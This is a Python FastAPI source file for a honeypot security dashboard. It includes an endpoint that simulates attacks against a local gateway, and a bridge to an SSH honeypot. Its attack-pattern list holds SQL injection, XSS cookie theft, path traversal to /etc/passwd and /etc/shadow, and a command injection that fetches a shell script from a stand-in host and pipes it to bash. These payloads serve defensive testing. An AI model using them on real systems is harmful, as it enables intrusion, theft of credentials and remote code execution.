from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import pandas as pd
import os
import subprocess
import requests
import time
import json
import asyncio
import paramiko
from datetime import datetime
import random

app = FastAPI()
templates = Jinja2Templates(directory="dashboard/templates")

CSV_PATH = "logs/traffic_labeled.csv"
LOGS_PATH = "logs/ai_logs.json"
METRICS_PATH = "logs/ai_metrics.json"

REQUEST_ID = 0

AI_ANALYSIS_LOG = "logs/ai_analysis.log"

def load_ai_analysis():
    if not os.path.exists(AI_ANALYSIS_LOG):
        return []

    records = []
    try:
        with open(AI_ANALYSIS_LOG, "r") as f:
            for line in f:
                try:
                    records.append(json.loads(line.strip()))
                except:
                    continue
    except Exception as e:
        print(f"[AI_ANALYSIS] Error: {e}")
        return []

    return records[-200:]  # last 200 entries

def load_data():
    if not os.path.exists(CSV_PATH):
        return pd.DataFrame(columns=[
            "src_ip", "dst_ip", "protocol",
            "packet_size", "timestamp", "label"
        ])
    return pd.read_csv(CSV_PATH)

def load_logs():
    """Load AI processing logs"""
    if not os.path.exists(LOGS_PATH):
        return []
    try:
        with open(LOGS_PATH, 'r') as f:
            return json.load(f)
    except:
        return []

def load_metrics():
    """Load latest AI model metrics"""
    if not os.path.exists(METRICS_PATH):
        return None
    try:
        with open(METRICS_PATH, 'r') as f:
            return json.load(f)
    except:
        return None

@app.get("/", response_class=HTMLResponse)
def dashboard(request: Request):
    return templates.TemplateResponse(
        "dashboard.html",
        {"request": request}
    )
 
@app.get("/stats")
def stats():
    df = load_data()

    total_packets = len(df)
    normal = int((df["label"] == 0).sum()) if not df.empty else 0
    suspicious = int((df["label"] == 1).sum()) if not df.empty else 0

    device_hits = (
        df["dst_ip"].value_counts().to_dict()
        if not df.empty else {}
    )

    # Fixed: Use timestamp column and create time buckets
    timeline = {}
    if not df.empty and "timestamp" in df.columns:
        try:
            # Convert timestamp to datetime if it's not already
            df['timestamp'] = pd.to_datetime(df['timestamp'])
            # Group by hour or by count index
            timeline = (
                df.groupby(df.index // 10)  # Group every 10 packets
                  .size()
                  .to_dict()
            )
        except:
            # Fallback: just use packet index
            timeline = {i: 1 for i in range(min(len(df), 20))}

    return {
        "total_packets": total_packets,
        "normal": normal,
        "suspicious": suspicious,
        "benign": normal,  # Added for compatibility
        "malicious": suspicious,  # Added for compatibility
        "device_hits": device_hits,
        "timeline": timeline
    }

@app.get("/logs")
def get_logs():
    """Get AI processing logs"""
    return {"logs": load_logs()}

@app.get("/metrics")
def get_metrics():
    """Get AI model performance metrics"""
    metrics = load_metrics()
    if metrics is None:
        return {"status": "no_data"}
    return metrics

@app.get("/export")
def export_dataset():
    return {
        "message": "Dataset ready",
        "path": CSV_PATH
    }

@app.get("/devices", response_class=HTMLResponse)
def devices(request: Request):
    device_info = {
        "real_devices": 5,
        "honeypot_devices": 3,
        "dummy_devices": 2
    }

    return templates.TemplateResponse(
        "devices.html",
        {
            "request": request,
            "devices": device_info
        }
    )

@app.get("/control", response_class=HTMLResponse)
def control_page(request: Request):
    return templates.TemplateResponse(
        "control.html",
        {"request": request}
    )

@app.get("/ai-monitor", response_class=HTMLResponse)
def ai_monitor(request: Request):
    return templates.TemplateResponse(
        "ai_monitor.html",
        {"request": request}
    )

@app.post("/control/inject")
def inject_traffic():
    try:
        subprocess.run(
            ["python3", "dashboard/traffic_injector.py"],
            check=True,
            capture_output=True,
            text=True
        )
        return {"status": "ok"}
    except subprocess.CalledProcessError as e:
        return {
            "status": "error",
            "stdout": e.stdout,
            "stderr": e.stderr
        }
        
@app.post("/control/analyze")
def run_ai():
    try:
        subprocess.run(
            ["python3", "ai_engine/hybrid_ai.py"],
            check=True,
            timeout=60
        )
        return {"status": "AI analysis complete", "success": True}
    except subprocess.TimeoutExpired:
        return {"status": "AI analysis timed out", "success": False}
    except Exception as e:
        return {"status": f"Error: {str(e)}", "success": False}

@app.get("/gateway_logs")
def gateway_logs():
    log_path = "logs/gateway.log"

    if not os.path.exists(log_path):
        return {"logs": []}

    entries = []
    try:
        with open(log_path, "r") as f:
            for line in f:
                try:
                    entries.append(json.loads(line.strip()))
                except:
                    continue
    except Exception as e:
        print(f"Error reading gateway logs: {e}")
        return {"logs": []}

    return {"logs": entries[-200:]}  

@app.get("/gateway", response_class=HTMLResponse)
def gateway_page(request: Request):
    return templates.TemplateResponse(
        "gateway.html",
        {"request": request}
    )

@app.get("/ai_analysis")
def ai_analysis():
    return {"records": load_ai_analysis()}


# ── Attack Simulation Endpoint ─────────────────────────────────────────────
import random as _random

ATTACK_PATTERNS = [
    # (path, method, body, attack_type, description)
    ("/admin/login",          "POST", "username=admin&password=admin123",           "brute_force",       "Admin login brute-force"),
    ("/admin/login",          "POST", "username=root&password=toor",                "brute_force",       "Root credential stuffing"),
    ("/wp-login.php",         "POST", "log=admin&pwd=password&wp-submit=Log+In",    "cve_probe",         "WordPress login attack"),
    ("/.env",                 "GET",  "",                                            "cve_probe",         "Environment file probe"),
    ("/.git/config",          "GET",  "",                                            "cve_probe",         "Git config exposure"),
    ("/phpmyadmin/",          "GET",  "",                                            "cve_probe",         "phpMyAdmin probe"),
    ("/api/v1/../../etc/passwd","GET","",                                            "path_traversal",    "Path traversal attack"),
    ("/cgi-bin/../etc/shadow", "GET", "",                                            "path_traversal",    "CGI path traversal"),
    ("/search?q=1' OR '1'='1","GET",  "",                                            "sqli",              "SQL injection probe"),
    ("/user?id=1 UNION SELECT * FROM users--","GET","",                             "sqli",              "UNION-based SQLi"),
    ("/comment",              "POST", "msg=<script>alert(document.cookie)</script>", "xss",               "Stored XSS attempt"),
    ("/api/ping",             "POST", "host=127.0.0.1; cat /etc/passwd",            "rce",               "Command injection"),
    ("/api/update",           "POST", "cmd=wget http://malicious.io/shell.sh|bash", "rce",               "Remote shell injection"),
    ("/firmware/update",      "POST", "file=../../../../etc/crontab",               "path_traversal",    "Firmware path traversal"),
    ("/status",               "GET",  "",                                            "recon",             "Device recon probe"),
    ("/device/info",          "GET",  "",                                            "recon",             "IoT device enumeration"),
    ("/xmlrpc.php",           "POST", "<methodCall><methodName>system.listMethods</methodName></methodCall>", "cve_probe", "XML-RPC enumeration"),
]

# Realistic attacker IPs
ATTACKER_IPS = [
    "45.33.32.156", "185.220.101.47", "192.168.99.254",
    "10.10.10.200",  "172.16.200.5",   "198.51.100.42",
    "203.0.113.99",  "91.108.4.1",     "185.130.5.231",
]

@app.post("/control/simulate_attack")
async def simulate_attack(request: Request):
    """
    Simulate a randomised attack request against the gateway.
    Picks a random attack pattern and attacker IP each time —
    nothing is hardcoded per invocation.
    """
    import requests as _req

    pattern   = _random.choice(ATTACK_PATTERNS)
    path, method, body, atype, desc = pattern
    src_ip    = _random.choice(ATTACKER_IPS)
    gateway   = "http://127.0.0.1:8080"

    # Vary the path slightly to avoid identical repeated requests
    if "{" not in path:
        suffixes = ["", "?debug=1", "?v=" + str(_random.randint(1,99)),
                    "?lang=en", "&id=" + str(_random.randint(1,9999))]
        path += _random.choice(suffixes)

    headers = {
        "X-Forwarded-For":  src_ip,
        "X-Real-IP":        src_ip,
        "X-Force-Suspicious": "1",  # demo override - guarantees honeypot routing, see gateway.py
        "User-Agent":       _random.choice([
            "Mozilla/5.0 (compatible; Googlebot/2.1)",
            "sqlmap/1.7.8#stable",
            "Nikto/2.1.6",
            "curl/7.68.0",
            "python-requests/2.28.0",
            "masscan/1.3.2",
            "zgrab/0.x",
        ]),
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        if method == "GET":
            r = _req.get(gateway + path, headers=headers, timeout=250)
        else:
            r = _req.post(gateway + path, data=body, headers=headers, timeout=250)

        return {
            "status":        "ok",
            "attack_type":   atype,
            "description":   desc,
            "path":          path,
            "method":        method,
            "body":          body,
            "src_ip":        src_ip,
            "http_status":   r.status_code,
            "response_body": r.text,
        }
    except Exception as e:
        return {
            "status":      "error",
            "attack_type": atype,
            "description": desc,
            "path":        path,
            "method":      method,
            "src_ip":      src_ip,
            "error":       str(e),
        }


# ── SSH Terminal Bridge — browser xterm.js <-> Beelzebub SSH honeypot ──────
# Connects to the LLM-driven SSH decoy (ssh-2222.yaml), not a real device.
# Credentials below are the honeypot's own fake login, not a real secret.
SSH_HONEYPOT_HOST = "127.0.0.1"
SSH_HONEYPOT_PORT = 5022          # honeypot_c1's mapped host port for :2222
SSH_HONEYPOT_USER = "admin"
SSH_HONEYPOT_PASS = "admin123"    # must match passwordRegex in ssh-2222.yaml

@app.get("/ssh-terminal", response_class=HTMLResponse)
def ssh_terminal_page(request: Request):
    return templates.TemplateResponse("ssh_terminal.html", {"request": request})

@app.websocket("/ws/ssh-terminal")
async def ssh_terminal_ws(websocket: WebSocket):
    await websocket.accept()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            SSH_HONEYPOT_HOST, port=SSH_HONEYPOT_PORT,
            username=SSH_HONEYPOT_USER, password=SSH_HONEYPOT_PASS,
            look_for_keys=False, allow_agent=False, timeout=10,
        )
    except Exception as e:
        await websocket.send_text(f"\r\n[connection failed: {e}]\r\n")
        await websocket.close()
        return

    channel = client.invoke_shell(term="xterm")
    channel.settimeout(0.0)  # non-blocking reads, polled below

    state = {"closed": False}

    async def pump_ssh_to_ws():
        while not state["closed"]:
            try:
                if channel.recv_ready():
                    data = channel.recv(4096)
                    if not data:
                        break
                    await websocket.send_text(data.decode(errors="replace"))
                else:
                    await asyncio.sleep(0.05)
            except Exception:
                break
        state["closed"] = True

    reader_task = asyncio.create_task(pump_ssh_to_ws())

    try:
        while True:
            data = await websocket.receive_text()
            channel.send(data)
    except (WebSocketDisconnect, Exception):
        pass
    finally:
        state["closed"] = True
        reader_task.cancel()
        try:
            channel.close()
            client.close()
        except Exception:
            pass
